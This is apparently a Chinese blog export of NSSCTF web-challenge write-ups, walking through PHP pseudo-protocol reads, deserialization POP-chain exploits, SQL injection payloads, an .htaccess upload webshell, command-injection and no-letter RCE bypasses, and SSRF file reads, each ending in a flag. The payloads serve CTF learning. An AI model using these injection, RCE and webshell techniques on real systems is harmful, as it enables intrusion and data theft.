qw&#x3D;phpinfo()查看一下，发现禁止了很多内置函数 show_source() 函数–禁止了很多内置函数时使用这里就要提一下这个函数了show_source() 函数对文件进行语法高亮显示。 show_source(filename,return) 本函数是 highlight_file 的别名。 filename 必需。要进行高亮处理的 PHP 文件的路径。return 可选。如果设置 true，则本函数返回高亮处理的代码。所以这道题的payload如下 1qw=show_source(&#x27;/flag&#x27;); 然后这里也可以在访问成功，显示了GIF89a的时候就用蚁剑连接也可以找到flag [GDOUCTF 2023]hate eat snake这个题在这个比赛的wp中我发过了 js逻辑漏洞硬玩，反正我不行查看一下网页源代码，找到js文件看到有一段很长的代码，然后划到最后去有alert前面有一个if判断语句 12if(this[&#x27;getScore&#x27;]()&gt;-0x1e9*-0xf+0x5*0x6d+-0x2e*0xaa)return alert(_0x324fcb(0x2d9,0x2c3,0x2db,0x2f3)+&#x27;k3r_h0pe_t&#x27;+_0xe4a674(0x5a1,0x595,0x59e,0x57c)+&#x27;irlfriend&#125;&#x27;),![]; 所以我们只要把if里面的语句改为真，那就可以成功出现弹窗，所以我们可以把if里面的判断条件改成1&#x3D;1找个js网站运行一下,就可以弹出flag，或者直接删去if语句，只留下alert语句然后在控制台执行也可以弹出flag然后还有的解是直接撞墙死了，然后弹窗按取消，然后等待一分钟，再次按空格开始，也会弹出flagNSSCTF{J_0k3r_h0pe_to_have_@_girlfriend} [LitCTF 2023]PHP是世界上最好的语言！！打开页面是一个加密的页面，如下 然后我们就在那个run code那个框里输入一些我们的代码，先试试 123&lt;?phpphpinfo();?&gt; 可以执行，题目又提示flag在根目录，所以 123&lt;?phpsystem(&quot;ls /&quot;); //然后再是system(&quot;cat /f*&quot;)?&gt; NSSCTF{206865c6-cf0a-4688-80e5-9c4ba625e85a}","categories":[{"name":"CTF做题wp","slug":"CTF做题wp","permalink":"https://qingwan.top/categories/CTF%E5%81%9A%E9%A2%98wp/"}],"tags":[],"author":"Qingwan"},{"title":"NSSCTF刷题记录②--web","slug":"nss②","date":"2024-01-08T05:59:52.922Z","updated":"2024-01-08T06:48:46.509Z","comments":true,"path":"2024/01/08/nss②/","link":"","permalink":"https://qingwan.top/2024/01/08/nss%E2%91%A1/","excerpt":"比较基础的一些web题②","text":"比较基础的一些web题② [ZJCTF 2019]NiZhuanSiWei 12345678910111213141516171819&lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 这道题，首先明白需要我们GET传参三个参数 然后我们需要绕过file_get_contents()函数 file_get_contents()绕过file_get_contents()的绕过用伪协议绕过，有下面几种用法： 用php://input伪协议绕过 （用于执行post中的php代码） 如果是GET传参： ?xxx=php://input 如果是POST传参： ?fn=php://input 然后再post传入想要传进的值 注意：enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的 用data://伪协议绕过 （ 自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输 ） ?xxx=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=(base64加密之后，需要传入的值） 这里是第一层伪协议，然后后面我们看到包含了一个useless.php文件，我们需要读取他，看到include，我们又想到了伪协议 用下面的php://filter伪协议来读取数据 ?xxx=php://filter/read=convert.base64-encode/resource=文件名 然后看到password是需要序列化的，我们猜测可能还有一层代码在useless.php中 我们先GET传参： ?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php 然后把得到的数据base64解密一下 123456789101112```&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; 大概意思就是把flag.php赋值给filepoc如下 12345678910111213141516&lt;?php class Flag&#123; //flag.php public $file=&quot;flag.php&quot;; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; $QW=new Flag(); echo serialize($QW);?&gt; 最后payload如下： ?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 然后查看源代码即可得到flag （这里最后的payload，file参数没有用伪协议了，这是为什么捏。其实这是因为 php:&#x2F;&#x2F;filter 伪协议，是把整个php文件，从一个可执行的状态变成了文本状态。 你已经用伪协议，把php文件给处理成文本状态了，自然就不能接着执行反序列化的代码了， 毕竟txt文本是没办法当作代码运行的。） [BJDCTF 2020]easy_md5打开环境是一个查询框，输入啥都没有什么反应。 查看一下响应头，发现下面这样一个提示，是一个sql注入 hint select * from &#39;admin&#39; where password=md5($pass,true) 里面的password就是我们输入的参数，这里就来到第一个考点了 md5(passwrod,true) 这里涉及到一个知识点，就是md5()函数中，如果第二个参数设为true，返回的是二进制内容，如果能用到类似’or之类的字符串，就可以构成SQL注入。 比如，一个网上说到最多的： ffifdyopmd5值为：276f722736c95d99e921722cf9ed621c再转换为字符串为&#39;or&#39;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c 这样拼接之后就是 select * from &#39;admin&#39; where password=&#39; &#39;or &#39;6...&#39; 所以相当于形成了一个万能密码，构成永真 所以这里我们第一步就是在查询框输入：ffifdyop 然后来到下一个界面，查看源代码，发现了这样一段提示代码 12345678&lt;!--$a = $GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123; header(&#x27;Location: levell14.php&#x27;);--&gt; 12345我们看到其实就是一个md5弱类型的比较，在刷题记录①的里提到过，就用数组绕过?a[]=1&amp;b[]=2然后就又发现了一段代码 123456789 &lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123; echo $flag;&#125; 好的这里就是md5的强比较了，之前也说过这里也是用数组绕过，post传参 paraml[]=1&amp;param2=2 [SWPUCTF 2021 新生赛]easyupload3.0打开环境是一个上传文件的界面 文件上传– .htaccess htaccess文件时Apache服务中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能 其中.htaccess文件内容：SetHandler application&#x2F;x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错 所以当我们没有办法上传其他文件时，我们可以通过上传.htaccess文件来getshell 我们首先新建一个.htaccess文件，内容如下 123&lt;FilesMatch &quot;1.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 我们先把.htaccess文件上传上去，然后再上传一句话木马（记住要把文件名改成1.jpg) 然后蚁剑连接 http://...../upload/1.jpg [SWPUCTF 2021 新生赛]PseudoProtocols打开环境，提示要我们读取hint.php php:&#x2F;&#x2F;filter伪协议1?wllm=php://filter/read=convert.base64-encode/resource=hint.php （这里要base64过滤器才读的出来）解密base64，提示访问 /test2222222222222.php这个路径然后看到了源码 12345678&lt;?php ini_set(&quot;max_execution_time&quot;, &quot;180&quot;); show_source(__FILE__); include(&#x27;flag.php&#x27;); $a= $_GET[&quot;a&quot;]; if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123; echo &quot;success\\n&quot;; echo $flag; &#125; ?&gt; 其中ini_set(&quot;max_execution_time&quot;, &quot;180&quot;);表示脚本执行时间就为180秒然后file_get_contents($a,&#39;r&#39;)) === &#39;I want flag表示用只读的方式读取变量啊然后变量a的值为后面那串字符串这里就用data伪协议来绕过test2222222222222.php?a=data://text/plain;base64,SSB3YW50IGZsYWc=然后就得到了flag [SWPUCTF 2021 新生赛]hardrce12345678910111213141516171819202122232425 &lt;?php header(&quot;Content-Type:text/html;charset=utf-8&quot;); error_reporting(0); highlight_file(__FILE__); if(isset($_GET[&#x27;wllm&#x27;])) &#123; $wllm = $_GET[&#x27;wllm&#x27;]; $blacklist = [&#x27; &#x27;,&#x27;\\t&#x27;,&#x27;\\r&#x27;,&#x27;\\n&#x27;,&#x27;\\+&#x27;,&#x27;\\[&#x27;,&#x27;\\^&#x27;,&#x27;\\]&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\-&#x27;,&#x27;\\$&#x27;,&#x27;\\*&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\=&#x27;,&#x27;\\`&#x27;,]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $wllm)) &#123; die(&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;); &#125;&#125; if(preg_match(&#x27;/[a-zA-Z]/is&#x27;,$wllm)) &#123; die(&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;); &#125; echo &quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;; eval($wllm); &#125; else &#123; echo &quot;蔡总说：注意审题！！！&quot;; &#125; ?&gt; 蔡总说：注意审题！！！ 看到了过滤了那些字符和字母然后要RCE 无字母RCE这里有三个方法 异或这里用system(ls)会报错(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;);所以异或应该不行，可以采用取反绕过 取反123456789&lt;?php$a = &quot;system&quot;;$b = &quot;cat /f*&quot;;echo urlencode(~$a);print(&quot;\\n&quot;);echo urlencode(~$b);?&gt; 最后Payload为/?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%D5); [NISACTF 2022]easyssrf看题目就知道是ssrf这里要我们curl一个网站(没有思路，网上看的wp)我看完是感觉有点谜语题的感觉了这里说是curl网站，其实是要我们访问一个路径试一下 1234/flag //得到提示：都说了这里看不了flag。。但是可以看看提示文件：/fl4g//访问一个路径，就用伪协议：file:///fl4g （不知道为什么//不行，///才行）然后又发现提示：你应该看看除了index.php，是不是还有个ha1x1ux1u.php然后就直接访问后面那个文件，看到一段源码 12345678910111213 &lt;?php highlight_file(__FILE__); error_reporting(0); $file = $_GET[&quot;file&quot;]; if (stristr($file, &quot;file&quot;))&#123; die(&quot;你败了.&quot;); &#125; //flag in /flag echo file_get_contents($file); 然后直接传参即可 ： ?file=/flag [SWPUCTF 2021 新生赛]error打开环境，看到显示了sqli，然后根据名字判断可能是报错注入报错注入是通过特殊函数错误的使用并且输出错误的结果来获取信息的 报错注入extractvalue()函数：函数原型：extractvalue(xml_document,Xpath_string)正常语法：extractvalue(xml_document,Xpath_string);第一个参数：xml_document是string格式，为xml文档对象的名称第二个参数：Xpath_string是xpath格式的字符串作用：从目标xml中返回包含所查询值的字符串 payload如下 1234567891011121 //显示id=11&#x27; //报错1&#x27; and extractvalue(null,concat(&#x27;~&#x27;,(database()),&#x27;~&#x27;))# //返回test_db/*在extractvalue()函数的第一个位置写null，使其故意报错,因为第一个位置本来应该写string格式的字符因为第一个位置报错，所以他会进而执行第二个位置上的语句，但是第二个位置上也不是正确的查询语句，所以会报错，进而也返回查询的结果*/1&#x27; and extractvalue(null,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;),&#x27;~&#x27;))# //返回test_tb,users1&#x27; and extractvalue(null,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&#x27;~&#x27;))# //返回USER,CURRENT_CONNECTIONS,TOTAL_1&#x27; and extractvalue(null,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;test_tb&#x27;),&#x27;~&#x27;))# //返回id,flag1&#x27; and updatexml(null,concat(&#x27;~&#x27;,(select group_concat(id,&#x27;~&#x27;,flag) from test_tb),&#x27;~&#x27;),1)#//返回：&#x27;~1~NSSCTF&#123;bfcd1575-b56b-4ee6-909&#x27; ，哟西，这好像只有一半啊 这里思考一下，还有一半会在哪里 报错注入显示不全的问题123456789101112131415161718192021222324252627282930这里我想的是会不会是他没有显示完全？我试了一下：1&#x27; and updatexml(null,concat(&#x27;~&#x27;,(select group_concat(flag) from test_tb ),&#x27;~&#x27;),1)#发现回显：NSSCTF&#123;bfcd1575-b56b-4ee6-9091-那证明确实是没有显示完全，于是我就去找了可以显示完全的方法第一个方法是用：limit 0,1limit子句用于限制查询结果返回的数量，常用于分页查询比如：&#x27;&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+limit子句含有两个参数，第一个参数表示从第几行数据开始查，第二个参数表示查几条数据要注意的是group_concat和limit不能同时使用但是这里我试了一下：1&#x27; and updatexml(null,concat(&#x27;~&#x27;,(select flag from test_tb limit 0,1 ),&#x27;~&#x27;),1)#还是和之前一样只显示一半，没有任何用第二个方法：使用mid()函数MID 函数用于从文本字段中提取字符。其中第一个参数是要提取的表名，第二个参数为起始位置，第三个参数为返回的字符个数这里试一下：1&#x27; and updatexml(null,concat(&#x27;~&#x27;,mid((select group_concat(flag) from test_tb ),1,50),&#x27;~&#x27;),1)#哟西，还是一样的，没有用！！！！！！！！！！但是最后我发现是有用的，如果是从1开始截取，取50个的话就不行但是下面的就可以，咱一次少取点：1&#x27; and updatexml(null,concat(&#x27;~&#x27;,mid((select group_concat(flag) from test_tb ),1,20),&#x27;~&#x27;),1)# //从1开始取20位1&#x27; and updatexml(null,concat(&#x27;~&#x27;,mid((select group_concat(flag) from test_tb ),15,20),&#x27;~&#x27;),1)#//从第15位往后取20位1&#x27; and updatexml(null,concat(&#x27;~&#x27;,mid((select group_concat(flag) from test_tb ),30,20),&#x27;~&#x27;),1)#//从第30位往后取20位然后把三次回显的数据，拼在一起即可 NSSCTF&#123;838bbc8a-d338-4e3a-83e7-31154205aeeb&#125; [SWPUCTF 2021 新生赛]pop反序列化，源码如下 123456789101112131415161718192021222324252627282930313233343536373839404142 &lt;?php error_reporting(0); show_source(&quot;index.php&quot;); class w44m&#123; private $admin = &#x27;aaa&#x27;; protected $passwd = &#x27;123456&#x27;; public function Getflag()&#123; if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123; include(&#x27;flag.php&#x27;); echo $flag; &#125;else&#123; echo $this-&gt;admin; echo $this-&gt;passwd; echo &#x27;nono&#x27;; &#125; &#125; &#125; class w22m&#123; public $w00m; public function __destruct()&#123; echo $this-&gt;w00m; &#125; &#125; class w33m&#123; public $w00m; public $w22m; public function __toString()&#123; $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;(); return 0; &#125; &#125; $w00m = $_GET[&#x27;w00m&#x27;]; unserialize($w00m); ?&gt; 分析一波，首先找到flag的位置，我们应该是要最后调用Getflag()方法，然后来让他输出flag这里我们找下入口：传参$w00m,直接反序列化，入口就在__destruct，或者_wakeup，这里的w22m符合条件所以这里的__destruct()魔术方法是入口链子也很简单：首先__destruct()魔术方法去echo一个对象，然后就调用到了__toString()方法，然后通过w00m调用到了Getflag()，链子如下： 1__destruct()-&gt;w33m.__toString()-&gt;Getflag() exp为： 123456789101112131415161718192021222324252627282930313233&lt;?php class w44m&#123; private $admin = &#x27;w44m&#x27;; protected $passwd = &#x27;08067&#x27;; &#125; class w22m&#123; public $w00m; &#125; class w33m&#123; public $w00m; public $w22m; &#125; $a = new w22m(); //入口$a-&gt;w00m = new w33m; //通过__destruct()魔术方法调用__toString()$a-&gt;w00m-&gt;w00m = new w44m; //通过__toString()进入到w44m类$a-&gt;w00m-&gt;w22m = &quot;Getflag&quot;; /*看到__toString()方法里有这样一句: $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;(); 这里的w00m在上上句中赋值为了w44m类的实例化对象，所以可以猜到这里的$this这个字符串应该是Getflag，这样上面那句话就为$this-&gt;w44m-&gt;Getflag(); 这样就成功调用了Getflag()方法，输出flag*/echo urlencode(serialize($a)); //这里需要urlencode一下，因为w44m中有private和protected变量，序列化之后会有不可见字符?&gt; 最后直接GET传参即可 1?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D NSSCTF{17d6721d-522e-465f-ba28-807adb29e4bf} [SWPUCTF 2021 新生赛]sql打开环境，页面提示有WAF测试步骤如下：（题目框提示了参数为wllm) 123456?wllm=1 //正常回显?wllm=1&#x27; //报错?wllm=1 1 //过滤了空格 --&gt; /**/?wllm=or //过滤了or?wllm=and //过滤了and?wllm=1=1 //过滤了= --&gt; like 所以payload如下： 12345678910?wllm=1&#x27;order/**/by/**/3%23 //正常回显?wllm=1&#x27;order/**/by/**/3%23 //报错，则证明有3列?wllm=-1&#x27;/**/union/**/select/**/1,2,3%23 //得出2，3为回显位?wllm=-1&#x27;/**/union/**/select/**/1,database(),3%23 //查数据库名，为test_db?wllm=-1&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/informa tion_schema.tables/**/where/**/table_schema/**/like/**/&#x27;test_db&#x27;%23 //得到表名有：LTLT_flag,users?wllm=-1&#x27;/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&#x27;LTLT_flag&#x27;%23//查询到列名有id,flag?wllm=-1&#x27;/**/union/**/select/**/1,group_concat(id,&#x27;~&#x27;,flag),3/**/from/**/test_db.LTLT_flag%23 好的，这里又只有一半，就像之前一样显示的不完全就像之前一样用mid()函数 123?wllm=-1&#x27;/**/union/**/select/**/1,mid(group_concat(flag),1,20),3/**/from/**/test_db.LTLT_flag%23?wllm=-1&#x27;/**/union/**/select/**/1,mid(group_concat(flag),15,20),3/**/from/**/test_db.LTLT_flag%23?wllm=-1&#x27;/**/union/**/select/**/1,mid(group_concat(flag),30,20),3/**/from/**/test_db.LTLT_flag%23 最后把三次读出来的拼一起即可NSSCTF&#123;6a640a43-e171-4a8d-93d0-451ef5110c7c&#125; [鹤城杯 2021]EasyP源码为： 123456789101112131415161718192021222324252627&lt;?php include &#x27;utils.php&#x27;; if (isset($_POST[&#x27;guess&#x27;])) &#123; $guess = (string) $_POST[&#x27;guess&#x27;]; if ($guess === $secret) &#123; $message = &#x27;Congratulations! The flag is: &#x27; . $flag; &#125; else &#123; $message = &#x27;Wrong. Try Again&#x27;; &#125; &#125; if (preg_match(&#x27;/utils\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123; exit(&quot;hacker :)&quot;); &#125; if (preg_match(&#x27;/show_source/&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))&#123; exit(&quot;hacker :)&quot;); &#125; if (isset($_GET[&#x27;show_source&#x27;])) &#123; highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;])); exit(); &#125;else&#123; show_source(__FILE__); &#125; ?&gt; 这道题有点懵，知识点没有怎么接触过首先看到题目 12345678if (isset($_POST[&#x27;guess&#x27;])) &#123; $guess = (string) $_POST[&#x27;guess&#x27;]; if ($guess === $secret) &#123; $message = &#x27;Congratulations! The flag is: &#x27; . $flag; &#125; else &#123; $message = &#x27;Wrong. Try Again&#x27;; &#125; &#125; 这一段，看似很简单，就直接输出flag了，但是实际上这里要满足的条件，secret参数根本找不到，所以这段根本就没有用，真的有用的是后面那些部分 $_SERVER[&#39;PHP_SELF&#39;],$_SERVER[&#39;REQUEST_URI&#39;],basename()函数的绕过那这里就先来了解一些前置知识： $_SERVER[&#39;PHP_SELF&#39;] 表示当前 php 文件相对于网站根目录的位置地址，与 document root 相关 比如：http://qingwan.top/index.php 则$_SERVER[‘PHP_SELF]的返回是 &#x2F;index.php $_SERVER[‘REQUEST_URI’]所有$_SERVER开头的都叫做预定义服务器变量 REQUEST_URI的作用是取得当前URI，也就是除域名外后面的完整的地址路径看看这两者的区别案例网址：https://qingwan.top/php/index.php/test/foo?username=qw` $_SERVER[&#39;PHP_SELF&#39;] 得到：/php/index.php/test/foo$_SERVER[&#39;REQUEST_URI&#39;] 得到：/php/index.php/test/foo?username=qw basement()函数：返回路径中的文件名部分首先这里要绕过那两个正则，这里用到了上面这三个知识点的一些属性 1231. basename()无法处理非ascii字符,即遇到非ascii字符会舍弃，那这里就绕过了第一个正则2. $_SERVER[&#x27;REQUEST_URI&#x27;]`不会将参数中的特殊符号进行转换， 也就是说它获取到的url上面的值，不会进行url解码 所以这里GET传参show_source时，由于有第一个正则，绕过了show_source，然后传入$_SERVER[&#39;PHP_SELF&#39;] 的值会进入basename()函数这里在我们可以在 index.php/utils.php 后面添加一个非ascii的字符串（比如一个汉字）或者%ff，即可绕过。 下划线的绕过show_source用show[source或者show.source绕过（绕过下划线的话可以考虑用 加号（+） 左中括号（[） 空格（ ） 点号（.）） 或者用url编码一下&#96;所以payload为： 12345/index.php/utils.php/%ff?73how_source=1/index.php/utils.php/%ff?show.source=1/index.php/utils.php/哈?show.source=1/index.php/utils.php/%81?show[source（这里必须得加上index.php(php网站的首页文件)，如果不加，会白屏） 这里还要记住一点，记得要用hackbar来传参NSSCTF&#123;66c093a4-43a8-48ad-8254-bc0e515d0c4b&#125; [NCTF 2018]签到题打开是百度的界面，url上有个/secret.php路由F12也什么都没有发现（后面看了网上的wp)需要Burp抓包，然后访问index.php，或者直接进入&#x2F;，之后就可以看到flag了，如果不用Burp，直接访问，会302进行一个跳转，又会重新跳转到/secret.php页面，所以我们还是得抓下包flag&#123;w3lc0m3_t0_nctf2018hhhhhhhhhhhh&#125; [GXYCTF 2019]Ping Ping Ping综合过滤，拼接绕过，base64编码绕过，Linux内联执行1234567891011121314127.0.0.1;ls //显示出了flag.php127.0.0.1;cat flag.php //不能执行，过滤了空格，这里用&lt;&gt;来绕过，而且也过滤了flag * [] ？&#123;&#125;127.0.0.1;a=g;tac$IFS$1fla$a.php //用$IFS$1代替空格，然后使用拼接绕过flag127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh //然后也可以用base64编码绕过，如果用上面那个代码的话，要记得执行之后查看源代码才看得到flag然后还有一种办法127.0.0.1;cat$IFS$9`ls` /*linux内联执行，执行之后查看源码，可以看到页面的源码和flag，因为有两个文件，这个相当于把这两个文件的内容都显示出来这里上面的payload都用的是tac，而不是cat，说下这两个的区别cat:由第一行开始显示内容，并将所有内容输出 tac:从最后一行倒序显示内容，并将所有内容输出*/ [NSSCTF 2022 Spring Recruit]ezgame查看源码说，分大于了65分就可以给flag（但是我真的是个游戏白痴，我连这个游戏怎么开始都不知道）根本看不到兔子…（没事了，后面发现我是傻呗，页面没有打开js)还是看源码吧，直接F12，查看Js文件，然后搜索nss就可以找到flag了NSSCTF&#123;6545e1fb-23ff-424c-8a34-7db9fd092d9d&#125; [SWPUCTF 2021 新生赛]finalrce打开之后看到源码 123456789101112131415 &lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;url&#x27;]))&#123; $url=$_GET[&#x27;url&#x27;]; if(preg_match(&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\\-|\\*|\\&quot;|\\&gt;|\\&lt;|\\%|\\$/i&#x27;,$url)) &#123; echo &quot;Sorry,you can&#x27;t use this.&quot;; &#125; else &#123; echo &quot;Can you see anything?&quot;; exec($url); &#125;&#125; 看到过滤了很多东西，我们需要GET传参url，首先看到最后的执行命令的地方exec命令不回显，需要执行命令后保存到文件中。所以这里会用到tee重定向命令即把一个命令的回显写入另一个文件中 123?url=l\\s / | tee 1.txt //然后访问1.txt看到了flag文件?url=tac /flllll\\aaaaaaggggggg | tee 2.txt//这里注意！！！ | 符号的前后要有空格 [NISACTF 2022]checkin源码如下 123456789 &lt;?php error_reporting(0); include &quot;flag.php&quot;; // ‮⁦NISACTF⁩⁦Welcome to if (&quot;jitanglailo&quot; == $_GET[ahahahaha] &amp;‮⁦+!!⁩⁦&amp; &quot;‮⁦ Flag!⁩⁦N1SACTF&quot; == $_GET[‮⁦Ugeiwo⁩⁦cuishiyuan]) &#123; //tnnd! weishenme b echo $FLAG; &#125; show_source(__FILE__); ?&gt; 这就是看似简单，实际有点烧脑这题我是懵逼的，去网上看了wp这个题你直接传参： 1?ahahahaha=jitanglailo&amp;cuishiyuan=N1SACTF //但是发现不对，确实也不可能那么简单 这里在尝试复制的时候，就有点奇怪，他后面会跟着你前面的选中的字符变然后看网上的wp说把这堆代码用vscode打开就可以看到隐藏的那些字符然后GET传参的时候，把那些unicode字符也传进去就好了这道题的原理如下：我们看到了这里面的一些隐藏字符，比如U+202E之类的 E280AE从右往左强制符。根据内存顺序从右往左显示字符。它是Unicode编码U+202E转UTF-8对应的十六进制编码 E281A6这之间的字符从左到右显示，不影响外围字符。 对于这个特殊字符，它的Unicode编号为：U+2066 E281A9这个字符的Unicode编号为：U+2069 作用：作为RLI、LRI、FSi翻转结束的标识。payload如下：（也可以直接用winhex打开，然后直接复制相关的编码，加上%） 1?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6cuishiyuan=%E2%80%AE%E2%81%A6+Flag!%E2%81%A9%E2%81%A6N1SACTF NSSCTF&#123;955e2262-2036-4f03-bb1d-243137e499c6&#125;","categories":[{"name":"CTF做题wp","slug":"CTF做题wp","permalink":"https://qingwan.top/categories/CTF%E5%81%9A%E9%A2%98wp/"}],"tags":[],"author":"Qingwan"},{"title":"NSSCTF刷题记录①--web","slug":"nss①","date":"2024-01-08T05:09:31.676Z","updated":"2024-01-08T06:00:49.172Z","comments":true,"path":"2024/01/08/nss①/","link":"","permalink":"https://qingwan.top/2024/01/08/nss%E2%91%A0/","excerpt":"比较基础的一些web题① （但是因为这篇笔记是之前的笔记软件记的，语法有点不一样，所以格式可能看起来就有点丑丑的，怪怪的）","text":"比较基础的一些web题① （但是因为这篇笔记是之前的笔记软件记的，语法有点不一样，所以格式可能看起来就有点丑丑的，怪怪的） [SWPUCTF 2021 新生赛]jicao12345678&lt;?phphighlight_file(&#x27;index.php&#x27;);include(&quot;flag.php&quot;);$id=$_POST[&#x27;id&#x27;];$json=json_decode($_GET[&#x27;json&#x27;],true);if ($id==&quot;wllmNB&quot;&amp;&amp;$json[&#x27;x&#x27;]==&quot;wllm&quot;)&#123;echo $flag;&#125;?&gt; 要传两个参数，而且涉及到json解密 payload: 12/?json=&#123;&quot;x&quot;:&quot;wllm&quot;&#125; //get传参id=wllmNB //post传参 [SWPUCTF 2021 新生赛]easy_md512345678910111213141516171819&lt;?php highlight_file(__FILE__); include &#x27;flag2.php&#x27;; if (isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123; $name = $_GET[&#x27;name&#x27;]; $password = $_POST[&#x27;password&#x27;]; if ($name != $password &amp;&amp; md5($name) == md5($password))&#123; echo $flag; &#125; else &#123; echo &quot;wrong!&quot;; &#125; &#125;else &#123; echo &#x27;wrong!&#x27;;&#125;?&gt; 这里就是要要求传参的两个参数不等，但是她们md5加密之后要相等，这里是md5的==(弱比较绕过）的绕过有两种方法 md5强比较，弱比较，二次加密的绕过md5弱比较绕过： 1.0e绕过 弱比较会把0exxxx当做科学计数法，不管后面的值为任何东西，0的任何次幂都为0 下面收集一些md5值是以0e开头的数 12345678910111213141516171819QNKCDZO** 0e830400451993494058024219903391s878926199a** 0e545993274517709034328855841020s155964671a** 0e342768416822451524974117254469s214587387a** 0e848240448830537924465865611904s214587387a** 0e848240448830537924465865611904s878926199a** 0e545993274517709034328855841020s1091221200a** 0e940624217856561557816327384675s1885207154a** 0e509367213418206700842008763514240610708** 0e462097431906509019562988736854payload:?a=QNKCDZO&amp;b=240610708 2.数组绕过 md5()函数计算的是一个字符串的哈希值，对于数组则返回false 所以可以用数组来绕过 1payload:?a[]=1&amp;b[]=2 md5强比较绕过： 因为强类型比较，不仅比较值，还比较类型，0e会被当做字符串，所以不能用0e来进行但是我们可以用MD5值完全相同的字符来进行绕过 所以强比较只能用数组绕过 md5两次加密绕过： 12345678910111213CbDLytmyGm2xQyaLNhWnCbDLytmyGm2xQyaLNhWn770hQgrBOjrcqftrlaZk770hQgrBOjrcqftrlaZk770hQgrBOjrcqftrlaZk7r4lGXCH2Ksu2JNT3BYM7r4lGXCH2Ksu2JNT3BY payload： 所以这里直接用数组绕过即可： 12？name[]=a //get传参password[]=b //post传参 [SWPUCTF 2021 新生赛]caidao打开页面显示： 1@eval($_POST[&#x27;wllm&#x27;]; 直接蚁剑连接，密码为wllm 